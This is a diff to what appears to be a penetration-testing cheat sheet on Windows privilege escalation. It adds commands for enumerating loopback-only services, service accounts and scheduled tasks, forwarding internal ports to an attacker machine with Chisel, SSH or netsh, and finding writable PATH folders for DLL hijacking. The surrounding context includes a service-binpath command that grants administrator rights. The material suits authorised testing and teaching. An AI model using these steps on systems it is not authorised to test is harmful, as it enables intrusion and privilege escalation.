@@ -13,6 +13,78 @@ net localgroup administrators
 systeminfo
 ```
 
+## Listening Services and Ports
+
+`netstat -ano` lists every listener with its owning PID. Addresses bound to `127.0.0.1` are **internal-only** services not reachable from the network: dev servers, databases, and admin consoles that often skip authentication on the assumption that only local users can reach them. These are prime privesc and lateral-movement targets.
+
+```powershell wrap
+netstat -ano | findstr LISTENING
+
+# PowerShell equivalent with the process name resolved
+Get-NetTCPConnection -State Listen |
+  Select-Object LocalAddress, LocalPort,
+    @{n='Proc';e={(Get-Process -Id $_.OwningProcess).ProcessName}} |
+  Sort-Object LocalPort
+```
+
+In the output below, every `127.0.0.1` port (5222, 7070, 9090/9091, …) belongs to PID `3228` — an Openfire XMPP server exposed only to loopback, while `5985` (WinRM) is network-facing:
+
+```
+  TCP    0.0.0.0:5985       0.0.0.0:0    LISTENING    4       <- WinRM, network-facing
+  TCP    127.0.0.1:9090     0.0.0.0:0    LISTENING    3228    <- internal admin console
+  TCP    127.0.0.1:5222     0.0.0.0:0    LISTENING    3228
+```
+
+### Identify the Process Behind a Port
+
+Most of this works as a low-privilege user; some fields blank out for protected processes.
+
+```powershell wrap
+tasklist /svc | findstr 3228
+Get-Process -Id 3228 | Select-Object Name, Path
+
+# Full command line and owning account
+Get-CimInstance Win32_Process -Filter "ProcessId=3228" |
+  Select-Object Name, ExecutablePath, CommandLine,
+    @{n='Owner';e={$_.GetOwner().User}}
+
+# older hosts / Server
+wmic process where processid=3228 get name,commandline,executablepath
+```
+
+### Enumerate Services as a Low-Priv User
+
+You don't need admin to see what services exist, what account they run as, and where their binaries live. This is where weak service permissions, unquoted paths, and writable service binaries turn up.
+
+```powershell wrap
+# Service, state, the account it runs as (StartName), and binary path
+Get-CimInstance Win32_Service |
+  Select-Object Name, State, StartName, PathName |
+  Format-Table -AutoSize
+
+sc.exe query                     # running services
+sc.exe qc <ServiceName>          # config: binary path + logon account
+net start                        # started services
+
+# Scheduled tasks — another route into a privileged context
+schtasks /query /fo LIST /v
+Get-ScheduledTask | Where-Object State -ne Disabled
+
+# Services are also readable in the registry
+reg query HKLM\SYSTEM\CurrentControlSet\Services
+```
+
+Cross-reference a loopback port's PID with its `Win32_Service` `StartName`: a service listening on `127.0.0.1` and running as `LocalSystem` or a domain account is a direct escalation target if you can influence its input, config, or binary.
+
+### Reaching an Internal Port
+
+Forward the loopback service to your attacker box:
+
+- **Ligolo-ng** — route `240.0.0.1/32`, then hit `240.0.0.1:<port>` (see [Ligolo-ng](/pivoting/ligolo#reaching-the-agents-localhost))
+- **Chisel** — `./chisel client $LHOST:8000 R:9090:127.0.0.1:9090`
+- **SSH** — `ssh -L 9090:127.0.0.1:9090 user@target`
+- **netsh** (admin only) — `netsh interface portproxy add v4tov4 listenport=9090 connectaddress=127.0.0.1 connectport=9090`
+
 ## AlwaysInstallElevated
 
 If both registry keys are set to 1, any user can install MSI packages as SYSTEM: generate a malicious installer and run it quietly.
@@ -41,6 +113,29 @@ If you can reconfigure a service binary path, swap it to a command that adds you
 sc config <service> binpath= "cmd /c net localgroup administrators <user> /add"
 sc stop <service> && sc start <service>
 ```
+
+## Writable PATH (DLL Hijacking)
+
+`set` dumps every environment variable, which tells you a lot about how the host is configured. The one that matters most for privesc is `PATH`. Admins and installers routinely prepend their own folders (Python, Java, custom tooling) — if one of those folders is **writable by your user**, you can drop a malicious DLL or EXE there and have another application or service load it.
+
+When resolving a name, Windows searches the **current working directory first**, then each `PATH` entry **left to right**. A writable folder placed *before* `C:\Windows\System32` is far more dangerous than one appended at the end, because it shadows legitimate system binaries and DLLs.
+
+```cmd wrap
+set                     :: all environment variables
+echo %PATH%             :: just the search path
+```
+
+```powershell wrap
+# PATH, one entry per line
+$env:PATH -split ';'
+
+# Flag PATH directories your user can write to
+foreach ($p in ($env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) })) {
+  icacls $p 2>$null | Select-String "$env:USERNAME|\\Users|Everyone|Authenticated Users"
+}
+```
+
+If a writable, high-priority directory exists, plant a DLL that a privileged service loads by unqualified name (see `Process Monitor` for `NAME NOT FOUND` on a DLL in a writable path), or a hijack EXE ahead of the real one.
 
 ## SeImpersonatePrivilege
 
